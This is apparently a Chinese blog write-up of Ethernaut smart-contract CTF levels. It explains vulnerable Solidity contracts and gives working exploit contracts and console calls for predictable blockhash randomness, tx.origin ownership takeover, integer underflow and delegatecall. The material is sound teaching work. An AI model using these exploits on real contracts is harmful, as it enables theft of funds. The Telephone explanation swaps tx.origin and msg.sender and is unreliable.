<li>view &#x2F; pure 函数：例如 balanceOf()、getContribution()。这类调用用 RPC 的 eth_call 执行，在节点本地运行，不会上链，不花 gas。</li>
<li>provider.getBalance(address)：查询余额，也不花 gas。</li>
<li>实战：在 ethers 中直接 await contract.getContribution() 返回 BigNumber，不花手续费，也不会弹钱包。</li>
</ul>
</li>
<li>状态写入 &#x2F; 转账 &#x2F; 部署 — 需要 gas<ul>
<li>任意会改变区块链状态的操作：contract.someStateChangingFn()、contract.contribute({value:…})、signer.sendTransaction({to:…, value:…})、合约部署（new Contract(…)）等。</li>
<li>这些操作必须由私钥签名（signer），发送到网络并由矿工&#x2F;验证者打包，发起者需要支付 gas（gasLimit × gasPrice 或 EIP-1559 的 maxFee 等）。</li>
<li>如果交易 revert 了也会消耗已使用的 gas。</li>
</ul>
</li>
<li>触发 receive() &#x2F; fallback() —— 属于写操作（需 gas）<ul>
<li>向合约发送空 data 的交易（data: “0x”）会触发合约的 receive()（或 fallback()），这同样改变状态时需要 gas。</li>
<li>例如 Ethernaut 的 Fallback 关卡：signer.sendTransaction({to: contract.address, value: …}) -&gt; 需要 gas。</li>
</ul>
</li>
<li>触发 receive() &#x2F; fallback() —— 属于写操作（需 gas）<ul>
<li>向合约发送空 data 的交易（data: “0x”）会触发合约的 receive()（或 fallback()），这同样改变状态时需要 gas。</li>
<li>例如 Ethernaut 的 Fallback 关卡：signer.sendTransaction({to: contract.address, value: …}) -&gt; 需要 gas。</li>
</ul>
</li>
<li>callStatic &#x2F; eth_call 模拟（不花 gas，但不改变状态）<ul>
<li>contract.callStatic.someFn(…) 或 provider.call({…}) 会在本地模拟执行状态改变函数，返回结果或 revert 原因，但不会上链也不收 gas。适合先试运行看返回&#x2F;会不会 revert。</li>
<li>注意：模拟成功不代表发送真实交易能成功（例如 gas limit、状态并发会导致差异）。\</li>
</ul>
</li>
<li>estimateGas（估算，不消费 gas）<ul>
<li>contract.estimateGas.someFn(…) 返回执行需的 gas 估算量（BigNumber），仅估算，不消耗 gas，可用于设置 gasLimit。</li>
<li>所以测试前用 callStatic 或 estimateGas 可以避免浪费。</li>
</ul>
</li>
</ol>
<h2 id="Solustion"><a href="#Solustion" class="headerlink" title="Solustion"></a>Solustion</h2><p>调用<code>Fal1out()</code>函数，任何人都可以将自己设置为合约的 owner。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function Fal1out() public payable &#123;  // 非构造函数</span><br><span class="line">    owner = msg.sender;  </span><br><span class="line">    allocations[owner] = msg.value;  </span><br><span class="line">&#125;   </span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title class_">Fal1</span>out()</span><br><span class="line">&#123;<span class="attr">tx</span>: <span class="string">&#x27;0x4cb1e325577c516536525abf501b57e4b3f78d9d9a498eca1051df4b98355bd2&#x27;</span>, <span class="attr">receipt</span>: &#123;…&#125;, <span class="attr">logs</span>: <span class="title class_">Array</span>(<span class="number">0</span>)&#125;</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">owner</span>()</span><br><span class="line"><span class="string">&#x27;0xFa1490340AAA139B8402d13c9f54e6738EF22bC3&#x27;</span></span><br></pre></td></tr></table></figure>

<h1 id="Coin-Flip"><a href="#Coin-Flip" class="headerlink" title="Coin Flip"></a>Coin Flip</h1><h2 id="Description-3"><a href="#Description-3" class="headerlink" title="Description"></a>Description</h2><p>这是一个掷硬币的游戏，你需要连续的猜对结果。完成这一关，你需要通过你的超能力来连续猜对十次。</p>
<p><strong>Beyond the console</strong>，有些关卡需要在控制台之外的操作。比如，用 solidity 写一些代码，部署合约在网络上，然后攻击实例。这可以通过很多方式完成, 比如：</p>
<ol>
<li>使用 Remix 写代码并部署在相应的网络上。参见 <a target="_blank" rel="noopener" href="https://remix.ethereum.org/">Remix Solidity IDE</a>。</li>
<li>设置一个本地 truffle 项目，开发并部署攻击合约。参见 <a target="_blank" rel="noopener" href="https://trufflesuite.com/">Truffle Framework</a>。</li>
</ol>
<h2 id="Code-3"><a href="#Code-3" class="headerlink" title="Code"></a>Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT  </span><br><span class="line">pragma solidity ^0.8.0;  </span><br><span class="line">  </span><br><span class="line">contract CoinFlip &#123;  </span><br><span class="line">    uint256 public consecutiveWins;  // 连胜数</span><br><span class="line">    uint256 lastHash;  </span><br><span class="line">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;  </span><br><span class="line">  </span><br><span class="line">    constructor() &#123;  </span><br><span class="line">        consecutiveWins = 0;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    function flip(bool _guess) public returns (bool) &#123;  </span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number - 1));  // 计算上一个区块哈希</span><br><span class="line">  </span><br><span class="line">        if (lastHash == blockValue) &#123;  // 区块相同则 revert()</span><br><span class="line">            revert();  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        lastHash = blockValue;  // 记录区块</span><br><span class="line">        uint256 coinFlip = blockValue / FACTOR;  // blockValue == FACTOR 才为正面（true）</span><br><span class="line">        bool side = coinFlip == 1 ? true : false;  </span><br><span class="line">  </span><br><span class="line">        if (side == _guess) &#123;  </span><br><span class="line">            consecutiveWins++;  </span><br><span class="line">            return true;  </span><br><span class="line">        &#125; else &#123;  </span><br><span class="line">            consecutiveWins = 0;  </span><br><span class="line">            return false;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Memo-3"><a href="#Memo-3" class="headerlink" title="Memo"></a>Memo</h2><p><strong>全局对象</strong></p>
<p>在 Solidity 里，block 是一个 全局对象，EVM 每次执行交易时都会提供当前区块的上下文信息。</p>
<table>
<thead>
<tr>
<th>字段</th>
<th>类型</th>
<th>含义</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>block.number</td>
<td>uint</td>
<td>当前区块号（高度）</td>
<td>每打一个新区块就 +1</td>
</tr>
<tr>
<td>block.timestamp</td>
<td>uint</td>
<td>区块时间戳（秒）</td>
<td>由矿工&#x2F;验证者填写，可以有 12-15 秒偏差，不能完全信任</td>
</tr>
<tr>
<td>block.difficulty</td>
<td>uint</td>
<td>工作量证明难度（已废弃 PoS）</td>
<td>现在固定值无意义</td>
</tr>
<tr>
<td>block.gaslimit</td>
<td>uint</td>
<td>当前区块的 gas 上限</td>
<td>整个区块所有交易 gas 总和不能超过它</td>
</tr>
<tr>
<td>block.basefee</td>
<td>uint</td>
<td>当前区块的基础手续费 (EIP-1559)</td>
<td>每个交易至少要付 basefee wei per gas</td>
</tr>
<tr>
<td>block.coinbase</td>
<td>address payable</td>
<td>出块者（矿工 &#x2F; 验证者）的地址</td>
<td>可以拿到奖励的那个地址</td>
</tr>
<tr>
<td>blockhash(uint blockNumber)</td>
<td>bytes32</td>
<td>返回指定区块的哈希</td>
<td>只能查最近 256 个区块，否则返回 0</td>
</tr>
</tbody></table>
<p>在 Solidity 里，msg 是一个全局对象，EVM 每次执行交易或调用合约函数时都会提供当前调用的上下文信息，包括调用者地址、附带 ETH 数量以及调用数据等。</p>
<table>
<thead>
<tr>
<th>字段</th>
<th>类型</th>
<th>含义</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>msg.sender</td>
<td>address</td>
<td>当前调用者地址</td>
<td>常用于权限控制</td>
</tr>
<tr>
<td>msg.value</td>
<td>uint</td>
<td>当前调用随交易转入的 wei</td>
<td>Payable 函数中常用</td>
</tr>
<tr>
<td>msg.data</td>
<td>bytes</td>
<td>完整调用数据（calldata）</td>
<td>包含函数选择器和参数</td>
</tr>
<tr>
<td>msg.sig</td>
<td>bytes4</td>
<td>函数选择器（前 4 字节）</td>
<td>常用于代理合约转发</td>
</tr>
</tbody></table>
<p>在 Solidity 里，tx 是一个全局对象，EVM 每次执行交易时都会提供当前交易的整体信息，包括最初发起交易的外部账户和 gas 价格等。</p>
<table>
<thead>
<tr>
<th>字段</th>
<th>类型</th>
<th>含义</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>tx.origin</td>
<td>address</td>
<td>发起交易的外部账户地址</td>
<td>不安全，不推荐用于权限控制</td>
</tr>
<tr>
<td>tx.gasprice</td>
<td>uint</td>
<td>当前交易 gas 价格</td>
<td>EIP-1559 后意义减弱</td>
</tr>
</tbody></table>
<p><strong>全局函数</strong></p>
<table>
<thead>
<tr>
<th>函数</th>
<th>返回类型</th>
<th>含义</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>keccak256(bytes)</td>
<td>bytes32</td>
<td>Keccak-256 哈希</td>
<td>最常用哈希函数</td>
</tr>
<tr>
<td>sha256(bytes)</td>
<td>bytes32</td>
<td>SHA-256 哈希</td>
<td>用得较少</td>
</tr>
<tr>
<td>ripemd160(bytes)</td>
<td>bytes20</td>
<td>RIPEMD-160 哈希</td>
<td>用得较少</td>
</tr>
<tr>
<td>ecrecover(hash, v, r, s)</td>
<td>address</td>
<td>签名恢复地址</td>
<td>链上签名验证常用</td>
</tr>
<tr>
<td>require(cond, msg)</td>
<td>-</td>
<td>条件检查，不满足回退</td>
<td>未使用的 gas 会退回</td>
</tr>
<tr>
<td>assert(cond)</td>
<td>-</td>
<td>内部错误检查，不满足回退</td>
<td>会消耗所有 gas，不常用</td>
</tr>
<tr>
<td>revert(msg)</td>
<td>-</td>
<td>主动触发回退，带原因</td>
<td>常与自定义错误配合</td>
</tr>
<tr>
<td>selfdestruct(address)</td>
<td>-</td>
<td>销毁合约并转账余额</td>
<td>未来可能被弃用</td>
</tr>
<tr>
<td>block.prevrandao</td>
<td>uint</td>
<td>PoS 随机数源（EIP-4399 引入）</td>
<td>替代 difficulty，更强随机性但仍非绝对安全</td>
</tr>
</tbody></table>
<h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><ol>
<li>随机数来源可预测：合约用 <code>blockhash(block.number - 1)</code> 作为随机种子。对于任意已经产生的区块，其 blockhash 是公开可读的、确定的，因此对手或脚本可以在链下计算出相同的值并据此做出“准确”的猜测。</li>
<li>lastHash 防止同一块重复调用：合约通过 lastHash 检测两次调用是否使用相同的 <code>blockhash(block.number - 1)</code> —— 如果相等 <code>revert()</code>。此检测只在同一目标 block 的两次 flip 调用被包含在同一区块时触发（因为两次在同一块被处理时，block.number - 1 相同）。</li>
</ol>
<p>CoinFlip_EXP.sol</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.10;</span><br><span class="line"></span><br><span class="line">import &quot;./CoinFlip.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract CoinFlip_EXP &#123;</span><br><span class="line">    CoinFlip target;</span><br><span class="line">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">    constructor(address _target) &#123;  // 初始化关卡的实例地址</span><br><span class="line">        target = CoinFlip(_target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function guess() public &#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">        bool side = (coinFlip == 1);</span><br><span class="line">        target.flip(side);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getConsecutiveWins() public view returns(uint256) &#123;  // 打印连胜数</span><br><span class="line">        return target.consecutiveWins();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>部署到 Sepolia 测试网，构造函数的参数传入关卡的实例地址。</p>
<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2025/202510022133168.png" alt="image.png"></p>
<p>Sepolia 平均区块时间约 12–15 秒，每次 guess 都需要等待区块打包，避免匹配到相同区块。</p>
<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2025/202510022150280.png" alt="image.png"></p>
<p>变量 consecutiveWins 的修饰符 public，会自动生成 <code>getter()</code>函数。</p>
<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2025/202510022153621.png" alt="image.png"></p>
<h1 id="Telephone"><a href="#Telephone" class="headerlink" title="Telephone"></a>Telephone</h1><h2 id="Description-4"><a href="#Description-4" class="headerlink" title="Description"></a>Description</h2><p>获得下面合约来完成这一关。</p>
<p><strong>Beyond the console</strong>，有些关卡需要在控制台之外的操作。比如，用 solidity 写一些代码，部署合约在网络上，然后攻击实例。这可以通过很多方式完成, 比如：</p>
<ol>
<li>使用 Remix 写代码并部署在相应的网络上。参见 <a target="_blank" rel="noopener" href="https://remix.ethereum.org/">Remix Solidity IDE</a>。</li>
<li>设置一个本地 truffle 项目，开发并部署攻击合约。参见 <a target="_blank" rel="noopener" href="https://trufflesuite.com/">Truffle Framework</a>。</li>
</ol>
<h2 id="Code-4"><a href="#Code-4" class="headerlink" title="Code"></a>Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT  </span><br><span class="line">pragma solidity ^0.8.0;  </span><br><span class="line">  </span><br><span class="line">contract Telephone &#123;  </span><br><span class="line">    address public owner;  </span><br><span class="line">  </span><br><span class="line">    constructor() &#123;  </span><br><span class="line">        owner = msg.sender;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    function changeOwner(address _owner) public &#123;  </span><br><span class="line">        if (tx.origin != msg.sender) &#123;  </span><br><span class="line">            owner = _owner;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Memo-4"><a href="#Memo-4" class="headerlink" title="Memo"></a>Memo</h2><p><strong>区别</strong></p>
<table>
<thead>
<tr>
<th><strong>名称</strong></th>
<th><strong>类型</strong></th>
<th><strong>含义</strong></th>
</tr>
</thead>
<tbody><tr>
<td>msg.sender</td>
<td>地址</td>
<td>直接调用当前函数的账户或合约地址。每次外部调用、内部调用都会更新。</td>
</tr>
<tr>
<td>tx.origin</td>
<td>地址</td>
<td>发起交易的最初 EOA（外部账户）地址，整个交易过程中不变。</td>
</tr>
</tbody></table>
<p><strong>interface</strong></p>
<p>接口是对外合约的“头文件“：只声明外部可调用的函数签名，不包含实现、不能有状态变量或构造函数。用于在一个合约里类型化调用另一个合约，而无需引入其完整源码。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">interface IExample &#123;</span><br><span class="line">    function foo(uint256 x) external returns (bool);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution"></a>Solution</h2><p>Telephone_EXP.sol</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT  </span><br><span class="line">pragma solidity ^0.8.0;  </span><br><span class="line">  </span><br><span class="line">interface ITelephone &#123;  </span><br><span class="line">    function changeOwner(address _owner) external;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">contract Telephone_EXP &#123;  </span><br><span class="line">    address public target;  </span><br><span class="line">  </span><br><span class="line">    constructor(address _target) &#123;  </span><br><span class="line">        target = _target;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    function attack() public &#123;  </span><br><span class="line">        ITelephone(target).changeOwner(tx.origin);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Telephone_EXP 内部调用 ITelephone.changeOwner(tx.origin) —— 这里 tx.origin（对于 Telephone）是 Telephone_EXP 合约地址，而 msg.sender 是发起交易的 EOA（与 tx.origin 不同），所以 owner 会被设置为 tx.origin。</p>
<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2025/202510022305311.png" alt="image.png"></p>
<p>执行 <code>attack()</code>，成为合约拥有者。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">owner</span>()</span><br><span class="line"><span class="string">&#x27;0xFa1490340AAA139B8402d13c9f54e6738EF22bC3&#x27;</span></span><br></pre></td></tr></table></figure>

<h1 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h1><h2 id="Description-5"><a href="#Description-5" class="headerlink" title="Description"></a>Description</h2><p>这一关的目标是攻破下面这个基础 token 合约。你最开始有20个 token， 如果你通过某种函数可以增加你手中的 token 数量，你就可以通过这一关，当然越多越好。</p>
<p>  这可能有帮助:</p>
<ul>
<li>什么是 odometer?</li>
</ul>
<h2 id="Code-5"><a href="#Code-5" class="headerlink" title="Code"></a>Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT  </span><br><span class="line">pragma solidity ^0.6.0;  </span><br><span class="line">  </span><br><span class="line">contract Token &#123;  </span><br><span class="line">    mapping(address =&gt; uint256) balances;  </span><br><span class="line">    uint256 public totalSupply;  </span><br><span class="line">  </span><br><span class="line">    constructor(uint256 _initialSupply) public &#123;  </span><br><span class="line">        balances[msg.sender] = totalSupply = _initialSupply;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    function transfer(address _to, uint256 _value) public returns (bool) &#123;  </span><br><span class="line">        require(balances[msg.sender] - _value &gt;= 0);  </span><br><span class="line">        balances[msg.sender] -= _value;  </span><br><span class="line">        balances[_to] += _value;  </span><br><span class="line">        return true;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    function balanceOf(address _owner) public view returns (uint256 balance) &#123;  </span><br><span class="line">        return balances[_owner];  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Memo-5"><a href="#Memo-5" class="headerlink" title="Memo"></a>Memo</h2><p><strong>整数溢出</strong></p>
<ul>
<li><strong>溢出（overflow）</strong>：正向运算（比如 a + b）结果 &gt; MAX，在无保护情况下结果会 mod 2^256（等于 a + b - 2^256），即环绕到小值。</li>
<li><strong>下溢（underflow）</strong>：减法 a - b 当 b &gt; a 时，结果在无保护情况下会变成 2^256 - (b - a)（接近 MAX 的大数）。</li>
<li>在 <strong>Solidity &lt; 0.8.0</strong>（如 0.6&#x2F;0.7）中算术不会自动检查，会发生 wrap-around。</li>
<li>在 <strong>Solidity &gt;&#x3D; 0.8.0</strong> 中，默认开启溢出&#x2F;下溢检查，发生时会 revert()。</li>
</ul>
<h2 id="Solution-3"><a href="#Solution-3" class="headerlink" title="Solution"></a>Solution</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function transfer(address _to, uint256 _value) public returns (bool) &#123;  </span><br><span class="line">    require(balances[msg.sender] - _value &gt;= 0);  </span><br><span class="line">    balances[msg.sender] -= _value;  </span><br><span class="line">    balances[_to] += _value;  </span><br><span class="line">    return true;  </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>当 <code>_value &gt; balances[msg.sender]</code> 时，便会下溢成非常大的整数。满足 <code>balances[msg.sender] - _value &gt;= 0</code>，且代码 <code>balances[msg.sender] -= _value;</code> 会改变 balances 映射的 Token。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">await</span> contract.<span class="title function_">balanceOf</span>(player)).<span class="title function_">toNumber</span>()  <span class="comment">// 查询当前玩家的 Token</span></span><br><span class="line"><span class="number">20</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">transfer</span>(<span class="string">&quot;0x22eCBB867C425eD6C5ef202Ba43Cbd207d54D822&quot;</span>,<span class="number">21</span>)  <span class="comment">// 20 - 21</span></span><br><span class="line">&#123;<span class="attr">tx</span>: <span class="string">&#x27;0xa4ee0a66fd2c4fdd673614cc38fa6e607804f11e7e7f0ba3a6f3d2643cfb07de&#x27;</span>, <span class="attr">receipt</span>: &#123;…&#125;, <span class="attr">logs</span>: <span class="title class_">Array</span>(<span class="number">0</span>)&#125;</span><br><span class="line">(<span class="keyword">await</span> contract.<span class="title function_">balanceOf</span>(player)).<span class="title function_">toNumber</span>()  <span class="comment">// 未捕获错误：数字只能安全存储 53 位数据。</span></span><br><span class="line"><span class="number">3.</span>0b5f29ba.<span class="property">chunk</span>.<span class="property">js</span>:<span class="number">3</span> <span class="title class_">Uncaught</span> <span class="title class_">Error</span>: <span class="title class_">Number</span> can only safely store up to <span class="number">53</span> bits</span><br><span class="line">    at <span class="title function_">n</span> (bn.<span class="property">js</span>:<span class="number">6</span>:<span class="number">21</span>)</span><br><span class="line">    at push.<span class="property">i</span>.<span class="property">toNumber</span> (bn.<span class="property">js</span>:<span class="number">506</span>:<span class="number">7</span>)</span><br><span class="line">    at &lt;anonymous&gt;:<span class="number">1</span>:<span class="number">36</span></span><br><span class="line">n @ bn.<span class="property">js</span>:<span class="number">6</span></span><br><span class="line">push.<span class="property">i</span>.<span class="property">toNumber</span> @ bn.<span class="property">js</span>:<span class="number">506</span></span><br><span class="line">（匿名） @ <span class="title class_">VM4776</span>:<span class="number">1</span>了解此错误</span><br></pre></td></tr></table></figure>

<h1 id="Delegation"><a href="#Delegation" class="headerlink" title="Delegation"></a>Delegation</h1><h2 id="Description-6"><a href="#Description-6" class="headerlink" title="Description"></a>Description</h2><p>这一关的目标是申明你对你创建实例的所有权。</p>
<p>这可能有帮助</p>
<ul>
<li>仔细看 solidity 文档关于 <code>delegatecall</code> 的低级函数，他怎么运行的，他如何将操作委托给链上库，以及他对执行的影响。</li>
<li>Fallback 函数</li>
<li>函数 ID</li>
</ul>
<h2 id="Code-6"><a href="#Code-6" class="headerlink" title="Code"></a>Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT  </span><br><span class="line">pragma solidity ^0.8.0;  </span><br><span class="line">  </span><br><span class="line">contract Delegate &#123;  </span><br><span class="line">    address public owner;  </span><br><span class="line">  </span><br><span class="line">    constructor(address _owner) &#123;  </span><br><span class="line">        owner = _owner;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    function pwn() public &#123;  </span><br><span class="line">        owner = msg.sender;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">contract Delegation &#123;  </span><br><span class="line">    address public owner;  </span><br><span class="line">    Delegate delegate;  </span><br><span class="line">  </span><br><span class="line">    constructor(address _delegateAddress) &#123;  </span><br><span class="line">        delegate = Delegate(_delegateAddress);  </span><br><span class="line">        owner = msg.sender;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    fallback() external &#123;  </span><br><span class="line">        (bool result,) = address(delegate).delegatecall(msg.data);  </span><br><span class="line">        if (result) &#123;  </span><br><span class="line">            this;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Memo-6"><a href="#Memo-6" class="headerlink" title="Memo"></a>Memo</h2><p> <strong>call</strong></p>
<p>调用目标合约的函数。会改变目标合约的状态变量（storage）。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(bool success, bytes memory data) = target.call&#123;value: 1 ether, gas: 5000&#125;(</span><br><span class="line">	abi.encodeWithSignature(&quot;foo(uint256)&quot;, 123)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p><strong>delegatecall</strong></p>
<p>调用目标合约的函数，使用目标合约的代码，却在当前合约的存储和上下文中执行。保持调用者的上下文，storage、msg.sender、msg.value。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(bool success, bytes memory data) = target.delegatecall(</span><br><span class="line">    abi.encodeWithSignature(&quot;foo(uint256)&quot;, 123)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p><strong>staticcall</strong></p>
<p>只读调用，只能调用 view&#x2F;pure 函数。不会修改状态。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(bool success, bytes memory data) = target.staticcall(</span><br><span class="line">	abi.encodeWithSignature(&quot;getValue()&quot;)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>行为</th>
<th>CALL</th>
<th>DELEGATECALL</th>
<th>STATICCALL</th>
</tr>
</thead>
<tbody><tr>
<td>代码执行位置</td>
<td>被调用合约代码</td>
<td>被调用合约代码</td>
<td>被调用合约代码</td>
</tr>
<tr>
<td>读写 storage</td>
<td>被调用合约 storage</td>
<td>调用者合约 storage</td>
<td>只读（不允许写）</td>
</tr>
<tr>
<td>msg.sender</td>
<td>调用者合约地址</td>
<td>原始外部调用者（preserved）</td>
<td>调用者合约地址</td>
</tr>
<tr>
<td>address(this)</td>
<td>被调用合约地址</td>
<td>调用者合约地址</td>
<td>被调用合约地址</td>
</tr>
<tr>
<td>改变合约余额</td>
<td>可以（向被调用合约转 value）</td>
<td>影响调用者合约 balance（因为 context 是调用者）</td>
<td></td>
</tr>
</tbody></table>
<p><strong>Storage</strong></p>
<p>Solidity 把状态变量（storage）按声明顺序分配到 32 字节的 storage slot（slot 从 0 开始），基本规则：</p>
<ol>
<li>顺序：按声明顺序分配（父合约的变量先于子合约；多重继承遵循线性化顺序）。</li>
